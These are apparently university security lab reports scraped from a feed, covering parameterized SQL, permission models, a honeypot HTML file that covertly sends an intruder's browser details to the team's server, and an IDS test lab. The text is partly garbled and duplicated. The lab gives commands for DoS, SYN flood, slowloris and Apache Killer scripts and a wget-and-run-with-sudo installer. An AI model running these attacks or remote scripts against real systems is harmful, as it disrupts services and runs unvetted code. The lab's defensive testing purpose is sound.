&lt;p&gt;To test Snort and acidbase, perform a portscan of the Snort host.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sudo nmap -p1-65535 -sV -sS -O 192.168.56.102&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;APPENDIX 6&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;To setup pytbull it is a bit of pain, yet if you follow the rules and
the documentation it will work like shark. For documentation please
refer to [pytbull_doc].&lt;/p&gt;

&lt;li&gt;Parameterized statements into Java with JDBC, C# with ASP.NET …&lt;/li&gt;&lt;/ol&gt;</summary><content type="html">&lt;h1&gt;INTRODUCTION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The main goal of this post is to introduce the reader with the security
programing techniques into deferent program languages and operating
system security models. The post is introducing four following topics:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Session storage’s in Ruby on Rail&lt;/li&gt;
&lt;li&gt;Parameterized statements into Java with JDBC, C# with ASP.NET,
    PHP5, php-mysqli, Perl, Python and Hibernate Query Language (HQL)&lt;/li&gt;
&lt;li&gt;Unix permission model, Unix ACL and Windows 7 security model&lt;/li&gt;
&lt;li&gt;Finding all the security vulnerabilities in bash script&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Each topic will be divided into own section, where at the end of each
topic we stated the reference and additional reading material. The
source code, scrips and the additional task were given by the lecture.
However this will help the readers and people interesting into
programing for further work and involvement with the above topics.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;1. Session storage’s in Ruby on Rail&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Session in Rails is a hash-like structure which allows you to store data
across requests. Sessions can hold any kind of data object (with some
limitations) because they store data using Data Marshalling.Session in
rails it is not a hash. Session creates new instant of session in every
time new user visit the site. Recommendation is to not store large
objects in a session and critical data should not be stored in
session.Rails way of&lt;/p&gt;
&lt;p&gt;implementing session is:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;session_id is a 32 hex character MD5 hash based upon time, random
    number and constant string. It is stored in cookie at client
    browser. Rails provides transparent support for session_id.&lt;/li&gt;
&lt;li&gt;Session storage discussed below.&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Ruby on Rails provides with many session storage option:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;PStore – it implements a file based persistence mechanism based on a
    Hash. User code can store hierarchies of Ruby objects (values) into
    the data store file by name (keys). An object hierarchy may be just
    a single object. User code may later read values back from the data
    store or even update data, as needed. The files that are stored are
    usually located in the tmp/sessions folder for the Rails app. The
    main downside of using the PStore is that you will have to do some
    session-pruning periodically because performance decreases as the
    number of sessions stored increases.&lt;/li&gt;
&lt;li&gt;ActiveRecordStore – keeps the session id and hash in a database
    table and saves and retrieves the hash on every request.&lt;/li&gt;
&lt;li&gt;CookieStore – it saves the session hash directly in a cookie on the
    client-side. The server retrieves the session hash from the cookie
    and eliminates the need for a session id. Cookie-based sessions are
    just faster to retrieve and process than hitting the file-system on
    every request, were it was previously. Cookies are generally limited
    to 4K in size. While not an issue for most (proper) usage of the
    session, this could be a legitimate limit for some scenarios. If
    your application abuses the session, you’ll need to decide on a
    different session store that are available. The cookie has a SHA512
    fingerprint attached and is hashed with a secret stored up on the
    server and there are, however, derivatives of CookieStore which
    encrypt the session hash, so the client cannot see it.&lt;/li&gt;
&lt;li&gt;DRbStore – it store uses distributed Ruby to store a user’s session
    data. The performance is great, but it requires a bit more setup
    than the other stores.&lt;/li&gt;
&lt;li&gt;FileStore – This store keeps the fragments on the hard disk instead
    of in memory. It works well if you have a lot of file storage and
    have outgrown the MemoryStore.&lt;/li&gt;
&lt;li&gt;MemoryStore – keeps your session data in server memory. It keeps the
    fragments in your application’s memory, which can potentially take
    up a lot of memory on your server. It is used by default, but it is
    hard to manage and scale if your application becomes popular.&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Ruby on Rail CookieStore is available only in edge rails.
PStore is the default option for stable release, whereas its CookieStore
as default for edge rails.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;h1&gt;2. Parameterized statements into Java with JDBC, C# with ASP.NET, PHP5, php-mysqli, Perl, Python and Hibernate Query Language (HQL)&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;For this task we will take a look at the parameterized statement API-s
and we will find out and document how much does each of them protect
against the following possible misuses of SQL statements:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;String injection (quotes, double quotes)&lt;/li&gt;
&lt;li&gt;SQL statement injection (expression syntax etc)&lt;/li&gt;
&lt;li&gt;Out of range integers&lt;/li&gt;
&lt;li&gt;Blind SQL injection&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h2&gt;Java with JDBC&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    PreparedStatement prep =conn.prepareStatement("SELECT * FROMUSERSWHERE USERNAME=? AND PASSWORD=?");prep.setString(1, username);prep.setString(2, password);prep.executeQuery();

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;There are no possibilities of string injection because of the filtering
the statements. It enables users’ input to be initially filtered
instead  of directly embedding it in the SQL statements. In this example
is that the each parameter is a scalar, not a table, where the user
input is then assigned (bound) to a parameter. It is a good idea if the
character range is limited. Another thing that can be done to avoid SQL
injection is to convert numeric values to integers before parsing them
into the SQL statement. Or using ISNUMERIC to verify that they are
integers.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;C# with ASP.NET&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    using (SqlCommand myCommand =new SqlCommand("SELECT * FROM USERSWHEREUSERNAME=@user ANDPASSWORD=HASHBYTES(’SHA1’, @pwd)",myConnection)){myCommand.Parameters.AddWithValue("@user",user);myCommand.Parameters.AddWithValue("@pwd",pass);myConnection.Open();SqlDataReader myReader =myCommand.ExecuteReader();...}

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;The placeholder – @user and the hashbyte value of password @pws – has
become part  if the hardcoded SQL. At runtime, the value provided by the
querystring is passed to the database along with the hardcoded SQL, and
the database will check the Username and password field as it attempts
to bind the parameter value to it. This ensures a level of strong
typing. If the parameter value is not the right type for the database
field (a string, or numeric that’s out of range for the field type), the
database will be unable to convert it to the right type and will reject
it. If the target field datatype is a string (char, nvarchar etc), the
parameter value will be “stringified” automatically, which includes
escaping single quotes. It will not form part of the SQL statement to be
executed.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PHP5&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    $db = new PDO(’pgsql:dbname=database’);$stmt = $db-prepare("SELECT priv FROM testUsers WHERE username=:username AND password=:password");$stmt-bindParam(’:username’, $user);$stmt-bindParam(’:password’, $pass);$stmt-execute();

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;In this example to protect against SQL injection, it is used an input
not directly to be  embedded in SQL statements. Instead, it is used an
parameterized statements (preferred), or user input must be carefully
escaped or filtered. This example shows and parameterized
example/statement in php v. 5 and PDO database to protect from SQL
injections and blind SQL injections.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PHP-MySQLi&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    $db = new mysqli("host", "user", "pass","database");$stmt = $db - prepare("SELECT priv FROM testUsers WHERE username=? AND password=?");$stmt -  bind_param("ss", $user, $pass);$stmt - execute();

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Same as above but this time it is used the vendor-specific methods; for
instance, using the mysqli extension for MySQL 4.1 and create
parameterized statements to protect from the SQL injection.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;Perl&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    use DBI;my $db = DBI-connect(’DBI:mysql:mydatabase:host’, ’login’, ’password’);$statment = $db-&amp;amp;amp;amp;amp;amp;gt;prepare("UPDATE players SET name = ?, score = ?, active = ? WHERE jerseyNum = ?");$rows_affected = $statment-&amp;amp;amp;amp;amp;amp;gt;execute("Smith, Steve", 42, ’true’, 99);

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Automatically “sanitize” input to parameterized SQL statements to avoid
the catastrophic  database attacks.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;Python&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    import sqlite3db = sqlite3.connect(’:memory:’)db.execute(’update players set name=:name, score=:score,active=:active where jerseyNum=:num’, {’num’: 100, ’name’: ’John Doe’, ’active’: False, ’score’: -1})

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;It is parameterized statement with an example of named placeholders.
Which insure to avoid the SQL injections and database attacks.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;Hibernate Query Language (HQL)&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    Query safeHQLQuery = session.createQuery("from Inventory where productID=:productid");safeHQLQuery.setParameter("productid", userSuppliedParameter);

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Unsafe example: Query unsafeHQLQuery = session.createQuery(“from
Inventory where productID=’”+userSuppliedParameter+”‘”); The example
from left it’s used prepared statement approach because all the SQL code
stays within the application. This makes your application relatively
database independent. However, other options allow you to store all the
SQL code in the database itself, which has both security and
non-security advantages and the approach is called Stored Procedure&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;3. Unix permission model, Unix ACL and Windows 7 security model&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In this topic we will describe two security set-ups that can not be
expressed with traditional Unix permission model, UNIX ACL and Windows 7
security model.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;Unix permission model&lt;/h2&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Giving an different permission to different users in the same group&lt;/li&gt;
&lt;li&gt;Read and write permission/access to all groups, which gives and
    access to the ‘private files’, and you can gain access through a
    root account by an unwanted user, which brings and complete breach
    of the system&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h2&gt;Unix ACL- enabled permission model&lt;/h2&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If the user has permission over the file, he can read/write and
    delete it, which brings that it is not possible to give ‘some’
    permission to the user.&lt;/li&gt;
&lt;li&gt;ACL’s are not very portable and are very hard to maintain. For
    instance good example is transferring of files with ACL’s between
    different of Unix systems is an exercise for brave person, even if
    the both file systems support them. Which brings a difficulty to
    maintain for existing files for instance backup, restore, copying,
    etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h2&gt;Windows 7 security model&lt;/h2&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;As a standard user you can perform an action that requires
    administrator privileges by the UAC(User Access Control), which is
    controlled by the Admin Approval Mode. It can be turn off and on.
    Every time when you need to gain an access of the administration
    privileges it will be prompt a dialog box to gain and provide the
    password for an access. Therefore in the medium settings with any
    malware could turn it off.&lt;/li&gt;
&lt;li&gt;And the settings of the UAC are in medium mode not off, still brings
    an opportunity to being turn off by the malware.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h1&gt;4. Finding all the security vulnerabilities in bash script&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In this topic we will find all the possible vulnerabilities into the
following bash script:&lt;/p&gt;
&lt;/p&gt;

|                                      |                                      |
|                                      | &lt;/p&gt;                                 |
|                                      | &lt;p&gt;                                  |
+--------------------------------------+--------------------------------------+&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;We should avoid temporary file, instead we should use pipes [2]. We
should avoid eval [2].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Using the double brackets, instead of single one &lt;code&gt;[[... ]]&lt;/code&gt; it is
comment on the script above [1]. \$REPLY can be used to read the
previous value of the dir and pattern variable [1]. We can use instead
of find, while read contracture (loop) [1]. Find – can be set with a
cycle, for or while to check the validation of the file and the
directory/path, also comment on the script or using
&lt;code&gt;“$pattern” /tmp/listing&lt;/code&gt; [1]. No sensitization of the input, the user
can put any value and therefore, execute any command to create another
command. As we can see above the script it looks like that it is
security vulnerable. If we want to implement the security in the script
we should implement the above changes into the script.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify possible leaked/stolen
information, documents from our system without recognising that attacker
had an access. Thus access of the document will inform us immediately
with the information of the burglar. The report should highlight the
following aspects:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Constructed an document …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h1&gt;INTRODUCTION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify possible leaked/stolen
information, documents from our system without recognising that attacker
had an access. Thus access of the document will inform us immediately
with the information of the burglar. The report should highlight the
following aspects:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Constructed an document as non malicious code, for instance honey
    document that will help us to track from where, who, information
    about the system, etc. is using our document.&lt;/li&gt;
&lt;li&gt;Detail description of process, how did we build the document and the
    idea behind the tracking system.&lt;/li&gt;
&lt;li&gt;Description of needed infrastructure that is tracking the document.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;The laboratory report is created by a team of 7 members. Where each
member had own task to accomplish. Moreover, to be more contingent the
unknown person has gain access to our computer/laptop. Thereby he is
looking for interesting name of file, folder, etc. that most likely will
have a content of interesting data, information for his purpose. After
he downloaded file/folder from our system the intruder will open this
file in his system assuming that contains very important
personal/corporate information. However, by opening this file/folder,
document it will send us immediately leaked information about his system
to our server and additionally an e-mail. This process and procedures
that are behind the honeypot document, or with other words trap set to
detect, deflect, or in some manner counteract attempts at unauthorized
use of information systems [1] is described in following sections.
Furthermore, the coding of the honeypot document is done in HTML file
with additional java script queries, where detail information and
construction are displayed in Honeypot section. Meanwhile in Appendix
section we provide the code of the honeypot document and additional what
is the leaked/collected information of the intruder system, with other
word, content illustration of mail and server logs.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally the conclusion made of the laboratory report will be concise in
summary section.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;HONEYPOT IDEA&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;HTML file We can name the file online banking or etc. cause it is html
and it is more convincing way that the attacker will assume that this is
an not only a online banking link but yet an the stored cookies and
other leaked information. The honeypot file has inline javascript that
will collect as much information as it can from the users browser, make
it into a JSON object and create a request to our server using that
information. The request will return an image, so nothing will be
broken, however on our server we decode the information and send
ourselves an alert email, that someone has accessed that document and
where the accessing came from. There is also an image embedded that
requests it from our server- these requests are logged and we see the IP
address of the opener. This is as a backup in case the user doesn’t
allow javascript to execute.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How we lure an attacker into trap&lt;/strong&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To discover the identity of attacker and get information, she/he has to
open html file. Besides setting up honeypot from technical point of
view, we have to make document attractive. On our system all the
documents will be protected by (different) passwords. We can have same
password for files with same extensions (for example, for PDFs or for MS
Word documents). In html file, we store these passwords. The name of
html document should be corresponding (“file passwords” for example).
Attacker will need additional time to crack the passwords, so we are
offering easy, quick way to get over additional obstacles. Actually, in
html file passwords should be correct not no make the attacker
suspicious. Attacker may be suspicious why we stored this kind of
information in html file, but it can be explained with the following
reasons: a) to open html (with notepad or browser for example) is
quicker than opening .pdf and .doc (by Adobe Reader and MS Word
respectively) b) html has different extension (.html) that PDF or MS
Word documents, so it has different icon in GUI. If you put a lot of
different files in a folder, html is much easier to find with a glance
among PDFs and DOCs.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What information we get&lt;/strong&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The honeypot is scripted to give us the following information about the
attacker: first of all IP address. Time, hen the attacker accessed the
honeypot file. Except that, we also get information about user agent,
OS, language and other details about attacker’s system. For this
concrete task that should be enough. The script is configurable to get
some additional information too. As our plan is to simply gather
information on our infiltrator, it is essential to avoid being malicious
with our code. It will not alter target’s system or bypass any
restrictions of it. The solution will not announce itself and will be as
stealthy as possible.&lt;/p&gt;
&lt;p&gt;The information is sent to mail. For the example of sent e-mail, please
refer to Appendix 2.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;HONEYPOT INFRASTRUCTURE&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;We need a Web server running PHP. The PHP script will collect the JSON
data received  &lt;/p&gt;
&lt;p&gt;from the attacker, format it nicely and send via email to people who
will process it. If  &lt;/p&gt;
&lt;p&gt;JavaScript is not enabled on the attacker’s side we rely on the fact
that a picture is  &lt;/p&gt;
&lt;p&gt;accessed from the honeypot html file. The server has to serve this image
and the request  &lt;/p&gt;
&lt;p&gt;for it of course appears in the web server access logs. This information
again is processed by the same PHP script mentioned above and forwarded
to analysts. Another alternative way to inform security personnel about
this honeypot image being accessed is the Simple Event Corelator (SEC)
written by Risto Vaarandi [2]. This software is freely available under
GPL license. We could write a rule for SEC that would monitor the web
server access log file for the specific image file request and send an
email with the IP address from which the image was accessed. The rule
that is used for SEC can be found in Appendix 3. The content we are
looking for in the log file may look like this:&lt;/p&gt;
&lt;p&gt;```192.168.1.34 - - [07/Dec/2011:19:16:07 +0200] "GET /honey.png
HTTP/1.1" 200 1932```&lt;/p&gt;
&lt;p&gt;# SUMMARY&lt;/p&gt;
&lt;p&gt;Nowadays the most common vector in unauthorized access into the system
is followed by stealing important data, either is from personal computer
or corporate network. Therefore, solution of implementing a trap for
detecting, and deflecting the attacker of collecting valuable
information is important. This laboratory report consists solution for
future detection, by creating an honeypot document that will help us to
collect data from the attacker. The document it self it is not an
malicious code, likewise does not corrupt or infect the attacker system.
Solution provided above is designed with an simple infrastructure which
help us to identify identity of attacker in different operation system.&lt;/p&gt;
&lt;p&gt;Moreover, the honeypot document provides us an information of what is
the attacker or user of this document operation system, which browser he
is using, what plugins are installed in the browser and additional the
time of accessing the file and attached IP address. Thereby, by
identifying the above information will guide us in further steps. For
instance by identifying his IP address we can find his location, ISP,
etc. However, is this above provided information enough? The answer to
the question is simple, indeed it is, cause we don’t need more. The idea
in this laboratory is not to find or assail the attacker, but it is just
to identify, and realize that someone had an unauthorized access to the
system and to distinguish his identity. Consequently, from the above we
can conclude that we rather gather the information from the attacker
then to attack him back.&lt;/p&gt;
&lt;p&gt;# APPENDICES&lt;/p&gt;
&lt;p&gt;Appendix 1 is the HTML and Java script code presented and in addition in
Appendix 2 we present the e-mail received after the attacker has open
the document. SEC are described in Appendix 3.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The objective of this laboratory test, scenario is to create a solution

&lt;/p&gt;

&lt;p&gt;The objective of this laboratory test, scenario is to create a solution
and instructions for testing an IDS\^1 systems usefulness for detecting
attacks against a wordpress site. In addition, a repeatable process to
evaluate vendor claims. Whatever passive IDS system sample delivered as
a VM or a dedicated box. Creating the IDS system itself is out of scope.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The process must be detailed enough so that somebody else can get the
same results when applying that. The “other person” is expected to have
IT knowledge sufficient to install and run a Linux desktop. Budget
requirements: Modest – 2 machines + a tester (Joe) + networking
equipment to connect the two machines and an IDS together. The process
must test at least the following attacks:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Port scan&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SYN flood&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;“Regular” DoS overwhelming attack (Ab)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Optionally the process may test:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;slowloris/pyloris&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Apache Range header DoS vulnerability
&lt;a href="http://httpd.apache.org/security/CVE-011-3192.txt"&gt;http://httpd.apache.org/security/CVE-011-3192.txt&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;An attack targeting any other fairly recent (not older than 3-4 years)
known vulnerability that could in theory apply to the target system
(wordpress server)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;However the competition rules are: The highest number of attacks
evaluated. Limits:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Each attack must be relevant eg. if it attacks IIS it’s NOT relevant.
If it attacks Windows RPC it’s not relevant. If it attacks some other
CMS eg. Drupal it’s NOT relevant. * Basically equivalent attacks count
as one (different port scanners for example).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;You must be able to explain in broad terms what the attack does eg:
attacks the vulnerability #X in Apache server If the #attacks is
equal.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Lab instaractions:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Install 3 VM-s: Attacker IDS and Target&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
​1. Make sure all VM-s have two network adapters: NAT and Host-Only.&lt;/p&gt;
&lt;p&gt;​2. Install Snort and it’s GUI called “acidbase” on IDS
&lt;a href="https://help.ubuntu.com/community/SnortIDS"&gt;https://help.ubuntu.com/community/SnortIDS&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;​3. Install Apache, Mysql and WordPress on Target.&lt;/p&gt;
&lt;p&gt;​4. Execute an attack on Attacker towards the IP address on the Host
Only network.&lt;/p&gt;
&lt;p&gt;​5. Take notice of the results displayed on Acid console.&lt;/p&gt;
&lt;p&gt;​6. Reset counters, move on to next attack.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Additionally, illustration 1 describes the overview of above scenario&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 1: Lab 5 Illustration of Scenario&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Firstly, setup procedure of snort, secondly available proposals and
thirdly illustrating the results and the functionality of proposals.
Finally, closing this laboratory report with conclusion. In addition,
appendixes is configuration of VM’s – Virtual Machines.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;SETUP of SNORT&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;To setup snort in a right way, that will work for the second Host only
network please following the instruction link provided with a full
description and configuration of snort [SNORT2].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;After completing the setup and configuration to run snort on the second
interface use the following command:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;snort -c /etc/snort/snort/conf -i eth1&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;PROPOSALS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In total three proposals and each one is highlighted in the next
sub-sections.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PROPOSAL 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Full instructions&lt;/p&gt;
&lt;p&gt;​1. Set up IDS (Snort) and WordPress on the first PC&lt;/p&gt;
&lt;p&gt;​2. Install Ubuntu server on the second PC . Then install all attacking
tools there:&lt;/p&gt;
&lt;p&gt;```wget enos.itcollege.ee/\~avein/lab4i.sh&lt;/p&gt;
&lt;p&gt;sudo sh lab4i.sh&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    After that you should have:- ```ab.sh``` – DoS attack script – uses ab to generate traffic flood- ```apachekiller.pl``` – Apachekiller attack script More info: http://www.hackersgarage.com/apache-killer-denial-of-service-flaw-in-apache-webserver.html- ```README.txt``` – extra instructions- ```scan.sh``` - Port scanning script - uses nmap- ```sloworis.pl``` - Sloworis attack script More info: http://ha.ckers.org/slowloris/- ```synf.sh``` - syn flood attack script - uses hping33. Start your IDS/wordpress server and the server with attack tools. 4. Run each attack tool ONE AT A TIME (targeting the wordpress/IDS server of course) . Monitor the logs/notifications on yours IDS system (SNORT) and check whether wordpress site is still accessible. Let each attack tool run 2 minutes, then stop the attack by pressing CTRL+C on the terminal window where the attack tool is running. The only exeption is port scan- its better to wait until it finishes. After each attack save the IDS log and wait atlest 5 minutes before trying next tool (to give server time to recover). Best practice is to manually check if the server load is at normal (one can use htop for that).a) To run DoS attack:```sh ab.sh {target} eg sh ab.sh 192.168.56.101```b) For port scan:```sh scan.sh {target IP} eg sh scan.sh 192.168.56.101```c) For Syn flood (with hping3)```sh synf.sh {target} eg synf.sh 192.168.56.101/wordpress```d) For Sloworis attack:```perl slowloris.pl -dns {target} eg perl sloworis.pl -dns 192.168.56.101/wordpress```e) For Apachekiller attack:```perl apachekiller.pl {target IP} eg perl apachekiller.pl 192.168.56.101```## PROPOSAL 2### IntroFor this scenario we need to run several different attacks and scans to be able to compare the results with different IDS setups and rulesets. We might also want to test it with legitimate traffic to see that we dont get false positives in our alarms. We dont have that much legitimate traffic possibilities with 1 blog on our servers right now, but if we start tweaking the IDS false positives becomes an important metric and we might want to test normal usage and create traffic to run with tcpreplay for example. My proposal is to test the IDS with pytbull running on BackTrack. Pytbull is IDS testing framework and BackTrack a Linux ditribution. I will assume that we have WordPress server with running default Snort set up on it and working. No extensive testing has been done with different snort setups so we might have to tune the methods, but basic things should be covered.### DL and install BackTrack- &lt;a href="http://www.backtrack-linux.org/downloads/" target="_blank"&gt;backtrack-linux.org/downloads/&lt;/a&gt;Install it rather than running a live version for this scenario. Boot it up in default mode, start GUI and launch installation from desktop. Default login root / toor. Standard setup comes with pytbull and several pieces of software the IDS test-system depends on like nmap, hping3, nikto and others.### Setup connectionsConnect the machines and install ftp and ssh on server. We need ftp to get snort alert files and ssh to run attacks against.```apt-get install vsftpd openssh-server```### Setup pytbullYou will find pytbull from ```/pentest/enumeration/ids/pytbull/``` or Applications -&gt; BackTrack -&gt; Information Gathering -&gt; Network Analysis -&gt; IDS IPS Identification -&gt; pytbull when using the GUI. Change the configuration file values to have correct connection information, user credentials and locations of dependencies. Here you also select which test modules out of the 9 available you want to run. ClientSideAttacks needs extra configuration.

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;cd /pentest/enumeration/ids/pytbull/&lt;/p&gt;
&lt;p&gt;gedit config.cfg&lt;/p&gt;
&lt;p&gt;Example conf file: http://www.tud.ttu.ee/\~t061780/attacks/config.cfg&lt;/p&gt;
&lt;p&gt;Now get custom DoS module to have hping SYN flood and ApacheBench DoS
tests covered.&lt;/p&gt;
&lt;p&gt;cd modules&lt;/p&gt;
&lt;p&gt;mv denialOfService.py denialOfService.py-backup&lt;/p&gt;
&lt;p&gt;wget http://www.tud.ttu.ee/\~t061780/attacks/denialOfService.py&lt;/p&gt;
&lt;p&gt;You may want to refer to Pytbull documentation&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    ### Run```/pentest/enumeration/ids/pytbull/pytbull -t WP/Snort server IP;```If everything works you will find html report file under /reports. If you have problems add -d on run for debugging.###(optional) SlowlorisTo have slowloris attack test for pytbull we need to get custom slowloris that allows to set how many packets to send because we dont want the tests to run forever. I added argument s that tells the script to stop after we have sent s packets.

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;cd /pentest/stressing&lt;/p&gt;
&lt;p&gt;wget www.tud.ttu.ee/\~t061780/attacks/slowloris.pl&lt;/p&gt;
&lt;p&gt;Slowloris attack has been written into DoS module, you have to uncomment
it. Lines 47-52.&lt;/p&gt;
&lt;p&gt;gedit /pentest/enumeration/ids/pytbull/modules/denialOfService.py&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    ## PROPOSAL 3For this proposal I will suggest to use open source tool OpenVas for vulnerability scanning, to test our IDS system. It contains many security tools integrated. The security and analysis tools are: Nikto, nmap, ike-scan, snmpwalk, amap, ldapsearch, SLAD (John-the-Ripper, Chkrootkit, LSOF, ClamAV, Tripwire, TIGER, logwatch, trapwatch, lm-sensors, snort and ovaldi), pnscan, portbunny, strobe, w3af, etc.Instructions of installation process, for further more information please refer to &lt;a href="http://www.openvas.org/setup-and-start.html" target="_blank"&gt;http://www.openvas.org/setup-and-start.html&lt;/a&gt;### Step 1: Configure OBS Repository```sudo apt-get -y install python-software-propertiessudo add-apt-repository "deb http://download.opensuse.org/repositories/security:/OpenVAS:STABLE:/v4/xUbuntu_10.04/./"sudo apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys BED1E87979EAFD54 sudo apt-get update

&lt;/div&gt;

&lt;/p&gt;

&lt;h3&gt;Step 2: Quick-Install OpenVAS&lt;/h3&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    sudo apt-get -y install greenbone-security-assistant gsd openvas-cli openvas-manager openvas-scanner openvas-administrator sqlite3 xsltproc

&lt;/div&gt;

&lt;/p&gt;

&lt;h3&gt;Step 3: Quick-Start OpenVAS&lt;/h3&gt;
&lt;/p&gt;

&lt;p&gt;(copy and paste whole block, during first time you will be asked to set
a password for user “admin”)&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

